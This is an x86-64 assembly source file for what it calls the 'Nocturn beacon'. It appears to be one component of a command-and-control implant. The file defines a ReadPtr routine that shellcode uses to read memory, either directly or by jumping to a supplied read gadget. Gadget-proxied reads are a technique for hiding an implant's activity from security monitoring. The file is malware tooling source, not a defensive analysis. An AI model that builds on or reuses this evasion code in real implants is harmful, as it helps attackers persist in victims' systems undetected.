;;
;; Nocturn beacon
;;
[BITS 64]

;;
;; Export
;;
GLOBAL ReadPtr

;;
;; shellcode functions
;;
[SECTION .text$B]

    ;;
    ;; reads/deref memory using specified gadget
    ;;
    ;; ReadPtr( target[rcx], gadget[rdx] )
    ;;
    ;; NOTE:
    ;;  if gadget is equal NULL then it is
    ;;  going to read the specified target
    ;;  normally (in the current function)
    ReadPtr:
        test rdx, rdx         ;; check if gadget[rdx] == NULL
        jz   norm             ;; if gadget[rdx] is NULL then read it normally

      ;; read using the specified gadget
      read:
        mov  rax, rcx         ;; specify what we wanna read.
        jmp  rdx              ;; jump to memory/pointer read gadget
        ret                   ;; we finished what we wanted to read

      norm:
        mov  rax, QWORD [rcx] ;; read specified pointer value into rax
	ret		      ;; we finished what we wanted to read

